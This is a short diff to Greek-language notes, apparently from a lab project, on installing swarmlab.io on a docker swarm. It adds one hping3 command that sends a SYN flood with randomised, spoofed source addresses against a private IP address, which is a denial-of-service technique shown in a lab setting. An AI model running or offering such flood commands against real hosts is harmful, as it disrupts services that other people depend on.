@@ -31,3 +31,8 @@
 
 Για να μπορέσει να γίνει η εγκατάσταση του swarmlab.io στο docker swarm ακολουθήθηκαν οι οδηγίες: http://docs.swarmlab.io/SwarmLab-HowTos/swarmlab/docs/swarmlab/docs/install/install-hybrid.html
 
+~~ Εκτέλεση της εντολής hping3 ~~
+
+```bash
+sudo hping3 -c 14000 -d 120 -S -w 64 -p 3088 --flood --rand-source 192.168.71.95
+```
